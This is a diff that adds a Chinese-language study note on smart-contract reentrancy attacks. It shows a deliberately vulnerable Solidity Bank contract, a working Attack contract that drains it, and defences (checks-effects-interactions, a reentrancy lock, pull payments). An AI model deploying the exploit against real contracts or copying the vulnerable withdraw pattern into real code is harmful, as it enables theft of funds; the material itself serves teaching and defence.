@@ -2699,6 +2699,83 @@ import '@openzeppelin/contracts/access/Ownable.sol';
 ### 2024.10.12
 
 - [104-S01] 重入攻击
+    - 攻击者通过合约漏洞（例如 fallback 函数）循环调用合约，将合约中资产转走或铸造大量代币。漏洞例子：
+    ```solidity
+    contract Bank {
+        mapping (address => uint256) public balanceOf;
+        function deposit() external payable {
+            balanceOf[msg.sender] += msg.value;
+        }
+        function withdraw() external {
+            uint256 balance = balanceOf[msg.sender];
+            require(balance > 0, "Insufficient balance");
+
+            (bool success, ) = msg.sender.call{value: balance}(""); // 漏洞代码
+            require(success, "Failed to send Ether");
+            balanceOf[msg.sender] = 0;
+        }
+
+        function getBalance() external view returns (uint256) {
+            return address(this).balance;
+        }
+    }
+    ```
+    - EXP：
+    ```solidity
+    contract Attack {
+        Bank public bank;
+        constructor(Bank _bank) {
+            bank = _bank;
+        }
+
+        receive() external payable {
+            if (bank.getBalance() >= 1 ether) {
+                bank.withdraw();
+            }
+        }
+
+        function attack() external payable {
+            require(msg.value == 1 ether, "Require 1 Ether to attack");
+            bank.deposit{value: 1 ether}();
+            bank.withdraw();
+        }
+
+        function getBalance() external view returns (uint256) {
+            return address(this).balance;
+        }
+    }
+    ```
+    - 防范方案：Check-Effect-Interaction 设计原则(检查-影响-交互模式)：编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。将Bank合约withdraw()函数中的更新余额提前到转账ETH之前即可：
+    ```solidity
+    function withdraw() external {
+        uint256 balance = balanceOf[msg.sender];
+        require(balance > 0, "Insufficient balance");
+        balanceOf[msg.sender] = 0;
+        (bool success, ) = msg.sender.call{value: balance}("");
+        require(success, "Failed to send Ether");
+    }
+    ```
+    - 重入锁:一种防止重入函数的修饰器（modifier），它包含一个默认为0的状态变量_status。被nonReentrant重入锁修饰的函数，在第一次调用时会检查_status是否为0，紧接着将_status的值改为1，调用结束后才会再改为0。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。
+    ```solidity
+    uint256 private _status;
+    modifier nonReentrant() {
+        require(_status == 0, "ReentrancyGuard: reentrant call");
+        _status = 1;
+        _;
+        _status = 0;
+    }
+
+    function withdraw() external nonReentrant{
+        uint256 balance = balanceOf[msg.sender];
+        require(balance > 0, "Insufficient balance");
+
+        (bool success, ) = msg.sender.call{value: balance}("");
+        require(success, "Failed to send Ether");
+
+        balanceOf[msg.sender] = 0;
+    }
+    ```
+    - OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过_asyncTransfer(address dest, uint256 amount)将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用withdrawPayments(address payable payee)进行资产的主动获取。
 - [104-S02] 选择器碰撞
 - [104-S03] 中心化风险
 
